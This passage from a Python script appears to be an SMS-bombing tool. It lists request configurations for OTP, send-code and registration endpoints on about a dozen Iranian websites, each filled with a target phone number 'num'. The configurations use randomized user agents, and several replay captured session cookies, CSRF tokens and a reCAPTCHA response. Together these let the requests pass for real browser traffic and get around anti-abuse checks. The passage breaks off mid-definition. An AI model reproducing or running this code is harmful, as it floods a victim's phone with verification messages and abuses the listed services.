    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data52 = f'------WebKitFormBoundaryDcrNXMBMkae5elIw\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\nAXPpFuK0gh2Mruiypz73NTTt4b0pzHDA0853lSqKc8fSHfBB57wxjRFxEKd1BH7n_Lj-9fV0e-MGVfOqO097ye1k40XrmvCehgkFiD47OVY1\r\n------WebKitFormBoundaryDcrNXMBMkae5elIw\r\nContent-Disposition: form-data; name="UserId"\r\n\r\n8dab5f76-9185-4e7b-bf22-4deffcabb36a\r\n------WebKitFormBoundaryDcrNXMBMkae5elIw\r\nContent-Disposition: form-data; name="UserName"\r\n\r\n{num}\r\n------WebKitFormBoundaryDcrNXMBMkae5elIw--\r\n'


url53 = "https://api.mobit.ir/api/web/v8/register/register"
cookies53 = {
    'advanced-api': 'a031637a2dbf88824b257e52caa8a71d',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    '_ga': 'GA1.2.999004392.1693684398',
    '_gid': 'GA1.2.1416367155.1693684398',
    '_gat_UA-121189844-2': '1',
    '_ga_JE66YCNCVJ': 'GS1.1.1693684397.1.1.1693684411.0.0.0',
}

headers53 = {
    'authority': 'api.mobit.ir',
    'accept': 'application/json',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'b2b': '0',
    'client-id': 'mobit_web',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'advanced-api=a031637a2dbf88824b257e52caa8a71d; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; _ga=GA1.2.999004392.1693684398; _gid=GA1.2.1416367155.1693684398; _gat_UA-121189844-2=1; _ga_JE66YCNCVJ=GS1.1.1693684397.1.1.1693684411.0.0.0',
    'device': '1',
    'mbt-url': 'https://www.mobit.ir/',
    'origin': 'https://www.mobit.ir',
    'os': '3',
    'referer': 'https://www.mobit.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
    'vue': '1',
}

json_data53 = {
    'number': num,
}

url54 = "https://www.celebon.ir/my-account/"
cookies54 = {
    '_gid': 'GA1.2.864276408.1693684645',
    '_gat_gtag_UA_193001732_1': '1',
    'PHPSESSID': '4ebe5f5b92c7a60e119563d1559a5c4d',
    '_ga_2PLS788JTS': 'GS1.1.1693684645.1.1.1693684652.53.0.0',
    '_ga': 'GA1.2.1320467630.1693684645',
    '_gali': 'bina_mobile_form',
}

headers54 = {
    'authority': 'www.celebon.ir',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gid=GA1.2.864276408.1693684645; _gat_gtag_UA_193001732_1=1; PHPSESSID=4ebe5f5b92c7a60e119563d1559a5c4d; _ga_2PLS788JTS=GS1.1.1693684645.1.1.1693684652.53.0.0; _ga=GA1.2.1320467630.1693684645; _gali=bina_mobile_form',
    'origin': 'https://www.celebon.ir',
    'referer': 'https://www.celebon.ir/my-account/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data54 = {
    '_bml_nonce_step1': 'e1924f4e81',
    '_wp_http_referer': '/my-account/',
    'username': num,
    'g-recaptcha-response': '03ADUVZwARC4eilhfSD4a9kodcE3KBpmBpuHCGODjxHtlNAFpZ74_2GTwKhCDE4yM2BjYn-v3zAw3oPGYnvn8yeTZlmMO3cxV5IZEmw7t3JDXJfWyiuElvIY64NBojJ1b_rNt4GfPpkKUxbtJgW17TGtmy46Jy2h_t1yY12sogzB-1gzs-ijQSH_fYala9_kI3pvAHQVUxQd2KNqcWJdcUxYv6InhNmjF-LEUDDtDCnXGMIMoBjWPFo6531iJZESzAoxi2rsS0VpN8oGzKlOxiBaJj_xXPAraNZCnStb_v1xhtzKwCbekUsnVvhvK-S6Psl5Ax8eMSRWKz8K0dPcFk1pDwpPeI1JDBiSPoLBT3a7K9pAHUEOSsLCO8EghVsRstwxy4w8_aFX8W72XfFIFCJYiRI7htBWlpuZ6Yx_lBwOeKDlwUBj-NBxaUPSGjM9VKdUEHNTdSPJs8yt0dOI9TqE6U7ui_uwpLcEgjvTWUjrDjc9b3ERC5tehapofoopXMRXmr65IY3knp-NbIiUhAQ8wAR0KGaxNjnISgi9SZQN1Rd4zBQl3JFUAcESBwGgdmYajMckgYTlaaJuOefqiUZ6kZyCqY05IuutHehjRvBVTiF0gKy4iAIoY',
}


url55 = "https://api.lendo.ir/api/customer/auth/send-otp"
headers55 = {
    'authority': 'api.lendo.ir',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://lendo.ir',
    'referer': 'https://lendo.ir/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data55 = {
    'mobile': num,
}

url56 = "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/"
cookies56 = {
    '_gcl_au': '1.1.81710031.1693568788',
    '_ga': 'GA1.1.874257882.1693568788',
    'analytics_token': '2d852601-5892-5148-833a-e65a338a6bc9',
    'cw_conversation': 'eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiIwZDkzODk5ZC01Y2M2LTRlODQtYTNlYi1hYzAzYjFjN2ZjY2EiLCJpbmJveF9pZCI6M30.dib7gpd9hJHbgHGeoePMg2CPMG-qlWYb77sWtConpdI',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'analytics_session_token': 'b09e495b-1af7-7bdf-35b1-e120577ee789',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_clck': '1wopqm8|2|feo|0|1339',
    '_clsk': 'um9z23|1693685218481|1|1|q.clarity.ms/collect',
    '_ga_43SWEC8CH3': 'GS1.1.1693685216.3.0.1693685229.47.0.0',
}

headers56 = {
    'authority': 'www.azki.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'fa',
    'content-type': 'application/json',
    # 'cookie': '_gcl_au=1.1.81710031.1693568788; _ga=GA1.1.874257882.1693568788; analytics_token=2d852601-5892-5148-833a-e65a338a6bc9; cw_conversation=eyJhbGciOiJIUzI1NiJ9.eyJzb3VyY2VfaWQiOiIwZDkzODk5ZC01Y2M2LTRlODQtYTNlYi1hYzAzYjFjN2ZjY2EiLCJpbmJveF9pZCI6M30.dib7gpd9hJHbgHGeoePMg2CPMG-qlWYb77sWtConpdI; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; analytics_session_token=b09e495b-1af7-7bdf-35b1-e120577ee789; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _clck=1wopqm8|2|feo|0|1339; _clsk=um9z23|1693685218481|1|1|q.clarity.ms/collect; _ga_43SWEC8CH3=GS1.1.1693685216.3.0.1693685229.47.0.0',
    'device': 'web',
    'deviceid': '6',
    'origin': 'https://www.azki.com',
    'referer': 'https://www.azki.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'user-name': 'null',
    'user-token': 'snN8zHY9Z55VOqsP6FzIzDsHdLQ7wapaOAwgR8CfqOf7UPWidtRV2LgxrzUL5K6e',
}

json_data56 = {
    'phoneNumber': num,
}

url57 = "https://payaneh.ir/api/code/send"
cookies57 = {
    'XSRF-TOKEN': 'eyJpdiI6Imw4aGwweVRKRDRjRzFsQUozYTVFVFE9PSIsInZhbHVlIjoiWTZPM3JudENWbmZmNFhxM0IwYmpYdzB3U0kwZUswWkRyb2lCMTVHVVd3QnJBVnVuYlNtQ3pCaUxiZGd5OS9NRmovUXN0dTh5RC9NRjZZT0xIcmxmbkp4YUhkVWVHRU9JbkVkc3R2YjNuSVBBTjN6aVE1WjNDYnhwWWgySlB0akciLCJtYWMiOiI0NmE3YzM3MzI5ZDU4OTBkMDVhMzE3ZTAxZTdhMDJiNWM3MDAwYjlhZDc1YjM2NGJlNDgzM2JkODZhZWYyNzhmIiwidGFnIjoiIn0%3D',
    'laravel_session': 'eyJpdiI6IkpFemZlRDgyQU5rMkNha2dxYUZJOWc9PSIsInZhbHVlIjoienUzVVNjUEJZaDY0eFNiWFdiZmF6SVc1QTd5R0MwSHQzOWJpSkJVb3NPUVpodis1bjBUbXM5VmtSQnRoclJJN3piOU5LYTkyUmhuSk81OUM1aVdOc1g2NWdyUDRpS1ZWbFptK0JncERjS1Q1NWZNSzVkeVBaMk93Q2xFT0NMNWgiLCJtYWMiOiI1YzIyMzYwNDM5NWUwYWUzM2VmZTQyOTRmOWNhMTA5NmI3MjYwOWU2YzEzMjZmYWUxMDc4N2IyYWY1N2FhNWU3IiwidGFnIjoiIn0%3D',
    '_ga_TBG10ZM3S3': 'GS1.1.1693685474.1.0.1693685474.0.0.0',
    '_ga': 'GA1.1.1689438216.1693685474',
}

headers57 = {
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'XSRF-TOKEN=eyJpdiI6Imw4aGwweVRKRDRjRzFsQUozYTVFVFE9PSIsInZhbHVlIjoiWTZPM3JudENWbmZmNFhxM0IwYmpYdzB3U0kwZUswWkRyb2lCMTVHVVd3QnJBVnVuYlNtQ3pCaUxiZGd5OS9NRmovUXN0dTh5RC9NRjZZT0xIcmxmbkp4YUhkVWVHRU9JbkVkc3R2YjNuSVBBTjN6aVE1WjNDYnhwWWgySlB0akciLCJtYWMiOiI0NmE3YzM3MzI5ZDU4OTBkMDVhMzE3ZTAxZTdhMDJiNWM3MDAwYjlhZDc1YjM2NGJlNDgzM2JkODZhZWYyNzhmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IkpFemZlRDgyQU5rMkNha2dxYUZJOWc9PSIsInZhbHVlIjoienUzVVNjUEJZaDY0eFNiWFdiZmF6SVc1QTd5R0MwSHQzOWJpSkJVb3NPUVpodis1bjBUbXM5VmtSQnRoclJJN3piOU5LYTkyUmhuSk81OUM1aVdOc1g2NWdyUDRpS1ZWbFptK0JncERjS1Q1NWZNSzVkeVBaMk93Q2xFT0NMNWgiLCJtYWMiOiI1YzIyMzYwNDM5NWUwYWUzM2VmZTQyOTRmOWNhMTA5NmI3MjYwOWU2YzEzMjZmYWUxMDc4N2IyYWY1N2FhNWU3IiwidGFnIjoiIn0%3D; _ga_TBG10ZM3S3=GS1.1.1693685474.1.0.1693685474.0.0.0; _ga=GA1.1.1689438216.1693685474',
    'Origin': 'https://payaneh.ir',
    'Referer': 'https://payaneh.ir/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

data57 = {
    'phone': num,
    '_token': '1HKulGbtcs2MXHmzuvNE1CwJrr4yYePprSLAU9hM',
}

url58 = "https://ids.dartil.com/authCustomer/CreateOtpForRegister"
headers58 = {
    'authority': 'ids.dartil.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://dartil.com',
    'referer': 'https://dartil.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': fake.random,
}

json_data58 = {
    'user': num,
}

url59 = "https://www.safirstores.com/index.php?route=account/login/getRandCode"
cookies59 = {
    'OCSESSID': 'e0852ae87e792ae04716b06091',
    'language': 'fa-ir',
    'currency': 'TOM',
    '_ga_KGP5J8DXTG': 'GS1.1.1693686261.1.0.1693686261.60.0.0',
    '_ga': 'GA1.2.1077411175.1693686261',
    '_gid': 'GA1.2.479567935.1693686261',
    '_gat_gtag_UA_111640810_1': '1',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '36b04d1e-c839-beae-5a0d-e3d35f15b958',
    'analytics_session_token': 'fb8abdb5-4f5d-d4ae-d00a-be998e602a0d',
    'yektanet_session_last_activity': '9/2/2023',
    '_yngt_iframe': '1',
    '_clck': '14k5apj|2|feo|0|1340',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'crisp-client%2Fsession%2F7a20ac30-2fed-4cfd-9aa7-e0ea09f0fa91': 'session_cccccccb-5475-4d29-88c1-c4d4f7e52b96',
    '_clsk': 'wz3n34|1693686262558|1|1|q.clarity.ms/collect',
}

headers59 = {
    'authority': 'www.safirstores.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OCSESSID=e0852ae87e792ae04716b06091; language=fa-ir; currency=TOM; _ga_KGP5J8DXTG=GS1.1.1693686261.1.0.1693686261.60.0.0; _ga=GA1.2.1077411175.1693686261; _gid=GA1.2.479567935.1693686261; _gat_gtag_UA_111640810_1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=36b04d1e-c839-beae-5a0d-e3d35f15b958; analytics_session_token=fb8abdb5-4f5d-d4ae-d00a-be998e602a0d; yektanet_session_last_activity=9/2/2023; _yngt_iframe=1; _clck=14k5apj|2|feo|0|1340; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; crisp-client%2Fsession%2F7a20ac30-2fed-4cfd-9aa7-e0ea09f0fa91=session_cccccccb-5475-4d29-88c1-c4d4f7e52b96; _clsk=wz3n34|1693686262558|1|1|q.clarity.ms/collect',
    'origin': 'https://www.safirstores.com',
    'referer': 'https://www.safirstores.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data59 = {
    'telephone': num,
}

url60 = "https://oauth.dgland.tech/api/otp/generate"
headers60 = {
    'authority': 'oauth.dgland.tech',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json',
    'origin': 'https://dgland.com',
    'referer': 'https://dgland.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': fake.random,
}

json_data60 = {
    'PhoneNumber': num,
}

url61 = "https://wistore.ir/wp-admin/admin-ajax.php"
cookies61 = {
    'd_user_session': '58ea03f99aecc7ba4da4f3d98e86e3b70d5c37ff181e0b03f63038bf60ebcb432d6fe5e370470e0811db76849f90e66373a8f332754c24f81cfb33a85afc2031',
    '_gcl_au': '1.1.2125192512.1693687028',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '3424dd47-4a0f-a955-f5be-6925d62f8767',
    'analytics_session_token': '112bd8b8-1cf5-ce35-159b-5786bd02cd04',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga': 'GA1.1.1374931178.1693687029',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_clck': 'sfuhrr|2|feo|0|1340',
    '_clsk': 'cqj88x|1693687030160|1|1|q.clarity.ms/collect',
    '_ga_QS3NTN9J8M': 'GS1.1.1693687028.1.0.1693687037.0.0.0',
}

headers61 = {
    'authority': 'wistore.ir',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'd_user_session=58ea03f99aecc7ba4da4f3d98e86e3b70d5c37ff181e0b03f63038bf60ebcb432d6fe5e370470e0811db76849f90e66373a8f332754c24f81cfb33a85afc2031; _gcl_au=1.1.2125192512.1693687028; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=3424dd47-4a0f-a955-f5be-6925d62f8767; analytics_session_token=112bd8b8-1cf5-ce35-159b-5786bd02cd04; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga=GA1.1.1374931178.1693687029; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _clck=sfuhrr|2|feo|0|1340; _clsk=cqj88x|1693687030160|1|1|q.clarity.ms/collect; _ga_QS3NTN9J8M=GS1.1.1693687028.1.0.1693687037.0.0.0',
    'origin': 'https://wistore.ir',
    'referer': 'https://wistore.ir/?login=true&page=1&redirect_to=https%3A%2F%2Fwistore.ir%2F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data61 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '70409e33eb',
    'login': '1',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'mobmail': num0,
    'dig_otp': '',
    'dig_nounce': '70409e33eb',
}

url62 = "https://www.papcoiran.com/"
cookies62 = {
    'PHPSESSID': '9rlp6viq45639vfcqh7f1cbm31',
    'PrestaShop-56bed448eddda26088b422a363fc8670': 'def50200927d7c567bf20c18b550c918c7844dba5e807533cae23e579a3d6bcad793169aa227879cdaf38118c5417a48d7d35f020d7c890e0ff4635d92c9a0c5205fe8510e0bddddbf0a358045aaad87f7b183e5dbd8d7f385cfda288a811e186bb3329d2f55eebb8c2e3a9318077e73600b1589390c63982b1d3222caec3c4d67e76c3a5907e73b39f2530890b4ecb7e8fbc696a9502625441b8fed0c538b3d51cf5f5b416a71f3d0bda7634d343d0a679a43975030b2ba3065abe5d8f444d54aaaba7639d5a76d7330dfa7f2105d6b3656bf4545b9fff6a8e2e1c6e3fd7076e33e2fd0a6b3180f5a3f6b723fa680d8c893af747bd271af72d6147738a447bd9a3b3d1a603ddf45a7d23dd74c0a7572c2d5da933ab22de20b63e03deb',
    'PrestaShop-596dbb9d0a40b8ae61af0ee604785101': 'def50200d086bc7c0fa0b3867643ad154f3b2235f2a06d98a7a44e6450a1f728e3d96052884682482efbf7863f631cb3cc87192b5481dc682fd6601103c7ede00b8ac72378ea901726cceb3118d183bbae0ad5aaf79ba6bc017e4c615195748bd7a2ba7e9ae5d672fea7f493d0cea8aa16641c1b1ccd97658afac8a2b5f656e79c65459acb8d55ec42caa85cff0a9e02a055fa8700653d68b22b6d3a007b53892d63279b934cf996bfb52c45e35d68faf9544e64b50da84bb15c4503af9bfc3b61cac2fe071150add1b51293543735f471f203ef3a315e8f22',
}

headers62 = {
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': 'PHPSESSID=9rlp6viq45639vfcqh7f1cbm31; PrestaShop-56bed448eddda26088b422a363fc8670=def50200927d7c567bf20c18b550c918c7844dba5e807533cae23e579a3d6bcad793169aa227879cdaf38118c5417a48d7d35f020d7c890e0ff4635d92c9a0c5205fe8510e0bddddbf0a358045aaad87f7b183e5dbd8d7f385cfda288a811e186bb3329d2f55eebb8c2e3a9318077e73600b1589390c63982b1d3222caec3c4d67e76c3a5907e73b39f2530890b4ecb7e8fbc696a9502625441b8fed0c538b3d51cf5f5b416a71f3d0bda7634d343d0a679a43975030b2ba3065abe5d8f444d54aaaba7639d5a76d7330dfa7f2105d6b3656bf4545b9fff6a8e2e1c6e3fd7076e33e2fd0a6b3180f5a3f6b723fa680d8c893af747bd271af72d6147738a447bd9a3b3d1a603ddf45a7d23dd74c0a7572c2d5da933ab22de20b63e03deb; PrestaShop-596dbb9d0a40b8ae61af0ee604785101=def50200d086bc7c0fa0b3867643ad154f3b2235f2a06d98a7a44e6450a1f728e3d96052884682482efbf7863f631cb3cc87192b5481dc682fd6601103c7ede00b8ac72378ea901726cceb3118d183bbae0ad5aaf79ba6bc017e4c615195748bd7a2ba7e9ae5d672fea7f493d0cea8aa16641c1b1ccd97658afac8a2b5f656e79c65459acb8d55ec42caa85cff0a9e02a055fa8700653d68b22b6d3a007b53892d63279b934cf996bfb52c45e35d68faf9544e64b50da84bb15c4503af9bfc3b61cac2fe071150add1b51293543735f471f203ef3a315e8f22',
    'Origin': 'https://www.papcoiran.com',
    'Referer': 'https://www.papcoiran.com/fa/module/iverify/authentication?back=my-account',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': fake.random,
    'X-Requested-With': 'XMLHttpRequest',
    'cache-control': 'no-cache',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

params62 = {
    'rand': '1693687525010',
}

data62 = {
    'controller': 'authentication',
    'ajax': 'true',
    'back': 'my-account',
    'fc': 'module',
    'module': 'iverify',
    'phone_mobile': num,
    'account_type': 'individual',
    'SubmitCheck': 'ایجاد حساب کاربری',
    'verify_token': 'Y1Y3bGdwOENrMndBc1N2M2EzUUlWQT09',
}

url63 = "https://www.lioncomputer.com/api/v1/auth/send-register-code"
cookies63 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '933661a0-6bb4-990f-2ae0-e2230bad1d56',
    'analytics_session_token': 'f2eb2a16-a426-a4ec-21fc-e7edfb0527c2',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_gid': 'GA1.2.1047716116.1693687893',
    '_gat_UA-102418714-1': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_1118039': '0',
    '_hjSession_1118039': 'eyJpZCI6ImNjMzk5M2MzLTg2NGItNDQ5ZC1hN2Y3LTBjMmQwNjg2MWI0NCIsImNyZWF0ZWQiOjE2OTM2ODc4OTQzMTksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    'crisp-client%2Fsession%2Ff9b7f903-a664-4fd2-b493-8c88722a4864': 'session_970b2f5e-07d1-49b0-bd77-5f932a5dfb30',
    'XSRF-TOKEN': 'eyJpdiI6IlJZK3liU0VFcDZCU2VnaWJpZHBzOEE9PSIsInZhbHVlIjoid1FpeExQM0pmMXM2a2lrT0dEa3lHMEVmNG5wYVhQTCsvQXdKNCt4YzVqeEhMUzdPMXhZVnRpQnRzRzZQOFFTMi9nWmQ5ckp0R2wraTUvTkpPSkxRb1VLcWcybURyQ01uRnp0dGpVT3R3cEE3ZCtEN29JMGJjNE81WGVWREdtaEgiLCJtYWMiOiIxZmU1OTQzNmNjMWU4MDM5MGMyZjM0MDljMDhmYjQ5MzA5MzZhNTVkMmI1MTQwNjQ5ZGY0YzM5MWMxNWJlNTgyIiwidGFnIjoiIn0%3D',
    'avo_session': 'eyJpdiI6ImZ5ZzV0a1FaZVVxTU5KVjNxV09nakE9PSIsInZhbHVlIjoiKzJWMjU1dzJZTFZJUDl3Q3lucFZSdEFnRjBhMDRxbHhaOFZ0QTRCWnQrMitLYlU5ZWtONW9pRFZxZ2h4SGNZTzBueVFNSGs1WTcycWF4SG9NQzlIUCtNakNOUmNWL1ZwMytPN215TDluRGk4NWp4cEoxTFhNRU1xaE5rcVBHcVciLCJtYWMiOiI1Yzc2YmNkMTk1Y2QwYjQ0ZTJiNWM3MzQyNDllYzQ2NDI2Mzg1ZjYzYWI2NDQzNWQ1YWIxZWViMmMzNTI4ZWMwIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.1.180863044.1693687893',
    '_hjSessionUser_1118039': 'eyJpZCI6ImU4NWRjZWU1LTVjYmUtNTI3Zi05OGIwLTViMDRlMzM2YjYxZSIsImNyZWF0ZWQiOjE2OTM2ODc4OTQzMTgsImV4aXN0aW5nIjp0cnVlfQ==',
    '_ga_R31PBPY1BS': 'GS1.1.1693687893.1.1.1693687909.44.0.0',
}

headers63 = {
    'authority': 'www.lioncomputer.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=933661a0-6bb4-990f-2ae0-e2230bad1d56; analytics_session_token=f2eb2a16-a426-a4ec-21fc-e7edfb0527c2; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _gid=GA1.2.1047716116.1693687893; _gat_UA-102418714-1=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _hjFirstSeen=1; _hjIncludedInSessionSample_1118039=0; _hjSession_1118039=eyJpZCI6ImNjMzk5M2MzLTg2NGItNDQ5ZC1hN2Y3LTBjMmQwNjg2MWI0NCIsImNyZWF0ZWQiOjE2OTM2ODc4OTQzMTksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; crisp-client%2Fsession%2Ff9b7f903-a664-4fd2-b493-8c88722a4864=session_970b2f5e-07d1-49b0-bd77-5f932a5dfb30; XSRF-TOKEN=eyJpdiI6IlJZK3liU0VFcDZCU2VnaWJpZHBzOEE9PSIsInZhbHVlIjoid1FpeExQM0pmMXM2a2lrT0dEa3lHMEVmNG5wYVhQTCsvQXdKNCt4YzVqeEhMUzdPMXhZVnRpQnRzRzZQOFFTMi9nWmQ5ckp0R2wraTUvTkpPSkxRb1VLcWcybURyQ01uRnp0dGpVT3R3cEE3ZCtEN29JMGJjNE81WGVWREdtaEgiLCJtYWMiOiIxZmU1OTQzNmNjMWU4MDM5MGMyZjM0MDljMDhmYjQ5MzA5MzZhNTVkMmI1MTQwNjQ5ZGY0YzM5MWMxNWJlNTgyIiwidGFnIjoiIn0%3D; avo_session=eyJpdiI6ImZ5ZzV0a1FaZVVxTU5KVjNxV09nakE9PSIsInZhbHVlIjoiKzJWMjU1dzJZTFZJUDl3Q3lucFZSdEFnRjBhMDRxbHhaOFZ0QTRCWnQrMitLYlU5ZWtONW9pRFZxZ2h4SGNZTzBueVFNSGs1WTcycWF4SG9NQzlIUCtNakNOUmNWL1ZwMytPN215TDluRGk4NWp4cEoxTFhNRU1xaE5rcVBHcVciLCJtYWMiOiI1Yzc2YmNkMTk1Y2QwYjQ0ZTJiNWM3MzQyNDllYzQ2NDI2Mzg1ZjYzYWI2NDQzNWQ1YWIxZWViMmMzNTI4ZWMwIiwidGFnIjoiIn0%3D; _ga=GA1.1.180863044.1693687893; _hjSessionUser_1118039=eyJpZCI6ImU4NWRjZWU1LTVjYmUtNTI3Zi05OGIwLTViMDRlMzM2YjYxZSIsImNyZWF0ZWQiOjE2OTM2ODc4OTQzMTgsImV4aXN0aW5nIjp0cnVlfQ==; _ga_R31PBPY1BS=GS1.1.1693687893.1.1.1693687909.44.0.0',
    'origin': 'https://www.lioncomputer.com',
    'referer': 'https://www.lioncomputer.com/login?redirect_url=aHR0cHM6Ly93d3cubGlvbmNvbXB1dGVyLmNvbQ==',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data63 = {
    'mobile': num,
